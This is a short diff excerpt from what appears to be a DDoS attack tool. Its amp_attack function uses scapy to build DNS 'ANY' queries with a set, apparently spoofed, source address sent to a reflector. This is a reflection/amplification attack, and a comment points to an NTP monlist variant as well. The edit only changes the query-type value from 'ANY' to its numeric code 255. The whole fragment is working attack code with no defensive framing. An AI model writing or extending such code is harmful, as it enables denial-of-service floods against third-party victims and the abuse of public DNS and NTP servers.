@@ -22,7 +22,9 @@ def amp_attack(reflector, victim=None, service="DNS", port=None):
             # Amplification via DNS ANY query
             pkt = scapy.IP(src=src_ip, dst=reflector)/ \
                   scapy.UDP(sport=random.randint(1024,65535), dport=port)/ \
-                  scapy.DNS(rd=1, qd=scapy.DNSQR(qname="example.com", qtype="ANY"))
+                  scapy.DNS(rd=1, qd=scapy.DNSQR(qname="example.com", qtype=255))
+        
+
 
         case "NTP":
             # NTP monlist request (legacy, still used in some old servers)
